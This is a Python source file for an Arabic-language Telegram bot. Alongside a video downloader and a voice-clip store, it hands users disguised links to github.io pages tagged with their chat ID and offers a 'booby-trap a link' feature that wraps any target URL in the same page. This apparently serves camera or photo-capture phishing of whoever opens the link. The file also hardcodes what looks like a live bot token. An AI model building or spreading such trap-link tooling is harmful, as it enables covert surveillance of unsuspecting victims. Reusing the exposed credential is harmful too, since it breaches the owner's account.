import os
import json
import urllib3
import telebot
from telebot import types
import threading
import http.server
import yt_dlp

# إيقاف التحذيرات
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BOT_TOKEN = os.getenv("BOT_TOKEN", "8128965245:AAGolmLae3ALVga_kcloXCK2zsFRODK4BXc")
bot = telebot.TeleBot(BOT_TOKEN)

DB_FILE = "/tmp/voice_db.json"
PHOTO_PAGE_URL = "https://app-display.github.io/ca.html-chatld-/"
VIDEO_PAGE_URL = "https://app-display.github.io/ca.html-chatId"
IMAGE_EDIT_URL = "https://app-display.github.io/-c-om-Copy-Translate-ate-vel-.app-c.html-chatld-/"

user_states = {}

# --- إدارة قاعدة البيانات ---
def load_db():
    if not os.path.exists(DB_FILE): return {"girl_1": [], "girl_2": []}
    with open(DB_FILE, 'r', encoding='utf-8') as f:
        try: return json.load(f)
        except: return {"girl_1": [], "girl_2": []}

def save_db(db):
    with open(DB_FILE, 'w', encoding='utf-8') as f:
        json.dump(db, f)

def run_dummy_server():
    port = int(os.environ.get("PORT", 8080))
    httpd = http.server.HTTPServer(('', port), http.server.SimpleHTTPRequestHandler)
    httpd.serve_forever()

def download_video_sync(url, chat_id):
    try:
        file_path = f'/tmp/vid_{chat_id}.mp4'
        ydl_opts = {'format': 'best', 'outtmpl': file_path, 'quiet': True}
        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
            if os.path.exists(file_path): os.remove(file_path)
            info = ydl.extract_info(url, download=True)
            return file_path, info.get('title', 'Video')
    except Exception as e: return None, str(e)

def get_main_keyboard():
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("🖼️ رابط صور", callback_data="get_photo_link"),
        types.InlineKeyboardButton("🎥 رابط فيديو", callback_data="get_video_link"),
        types.InlineKeyboardButton("✨ رابط تعديل", callback_data="get_image_edit_link"),
        types.InlineKeyboardButton("📥 تحميل فيديو", callback_data="dl_video"),
        types.InlineKeyboardButton("🌐 أخبار وبث مباشر", callback_data="news_menu"),
        types.InlineKeyboardButton("💣 تلغيم رابط", callback_data="inject_start"),
        types.InlineKeyboardButton("🎧 قسم الصوتيات", callback_data="voice_menu")
    )
    return markup

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.send_message(message.chat.id, "👋 أهلاً بك، المطور سيف الدين يرحب بك!", reply_markup=get_main_keyboard())

@bot.callback_query_handler(func=lambda call: True)
def handle_query(call):
    chat_id = call.message.chat.id
    db = load_db()

    if call.data == "voice_menu":
        markup = types.InlineKeyboardMarkup(row_width=2)
        markup.add(types.InlineKeyboardButton("👩 الفتاة 1", callback_data="girl_1_menu"),
                   types.InlineKeyboardButton("👩 الفتاة 2", callback_data="girl_2_menu"),
                   types.InlineKeyboardButton("🔙 عودة", callback_data="main_menu"))
        bot.edit_message_text("🎧 اختر المجلد:", chat_id, call.message.message_id, reply_markup=markup)

    elif call.data.endswith("_menu"):
        girl = call.data.replace("_menu", "")
        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(types.InlineKeyboardButton("▶️ عرض المقاطع", callback_data=f"show_{girl}"),
                   types.InlineKeyboardButton("➕ إضافة مقطع", callback_data=f"add_{girl}"),
                   types.InlineKeyboardButton("🔙 عودة", callback_data="voice_menu"))
        bot.edit_message_text(f"📁 إدارة {girl.replace('_', ' ')}:", chat_id, call.message.message_id, reply_markup=markup)

    elif call.data.startswith("show_"):
        girl = call.data.replace("show_", "")
        files = db.get(girl, [])
        if not files: bot.answer_callback_query(call.id, "المجلد فارغ!")
        else:
            for file_id in files: bot.send_voice(chat_id, file_id)
            bot.answer_callback_query(call.id, "تم إرسال المقاطع")

    elif call.data.startswith("add_"):
        girl = call.data.replace("add_", "")
        count = len(db.get(girl, []))
        limit = 10 if girl == "girl_1" else 13
        if count >= limit:
            bot.answer_callback_query(call.id, f"❌ المجلد ممتلئ ({count}/{limit})")
        else:
            user_states[chat_id] = call.data
            bot.edit_message_text(f"🎤 أرسل المقطع الصوتي الآن ({count}/{limit}):", chat_id, call.message.message_id)

    elif call.data == "inject_start":
        user_states[chat_id] = "waiting_for_inject"
        bot.edit_message_text("💣 أرسل الرابط المطلوب:", chat_id, call.message.message_id)

    elif call.data == "dl_video":
        user_states[chat_id] = "waiting_for_url"
        bot.edit_message_text("📥 أرسل رابط الفيديو الآن:", chat_id, call.message.message_id)

    elif call.data == "main_menu":
        bot.edit_message_text("🤖 القائمة الرئيسية:", chat_id, call.message.message_id, reply_markup=get_main_keyboard())
    
    elif call.data == "get_photo_link": bot.send_message(chat_id, f"🖼️ الرابط: {PHOTO_PAGE_URL}?chatId={chat_id}")
    elif call.data == "get_video_link": bot.send_message(chat_id, f"🎥 الرابط: {VIDEO_PAGE_URL}?chatId={chat_id}")
    elif call.data == "get_image_edit_link": bot.send_message(chat_id, f"✨ الرابط: {IMAGE_EDIT_URL}?chatId={chat_id}")
    
    bot.answer_callback_query(call.id)

@bot.message_handler(content_types=['voice', 'text'])
def handle_messages(message):
    chat_id = message.chat.id
    state = user_states.get(chat_id)

    if state and state.startswith("add_"):
        girl = state.replace("add_", "")
        db = load_db()
        limit = 10 if girl == "girl_1" else 13
        
        if len(db[girl]) < limit:
            db[girl].append(message.voice.file_id)
            save_db(db)
            current = len(db[girl])
            bot.reply_to(message, f"✅ تم الحفظ! المجلد يحتوي الآن على ({current}/{limit})")
            if current >= limit: user_states[chat_id] = None
        else:
            bot.reply_to(message, "❌ المجلد ممتلئ بالفعل!")
            user_states[chat_id] = None

    elif state == "waiting_for_inject":
        target = message.text if message.text.startswith("http") else f"https://{message.text}"
        bot.reply_to(message, f"✅ تم التلغيم:\n{PHOTO_PAGE_URL}?target={target}&chatId={chat_id}")
        user_states[chat_id] = None

    elif state == "waiting_for_url":
        status_msg = bot.reply_to(message, "⏳ جاري التحميل... يرجى الانتظار")
        path, title = download_video_sync(message.text, chat_id)
        if path:
            bot.send_video(chat_id, open(path, 'rb'), caption=title)
            bot.delete_message(chat_id, status_msg.message_id)
            os.remove(path)
        else:
            bot.edit_message_text(f"❌ فشل التحميل.", chat_id, status_msg.message_id)
        user_states[chat_id] = None

if __name__ == '__main__':
    threading.Thread(target=run_dummy_server, daemon=True).start()
    bot.polling(none_stop=True)
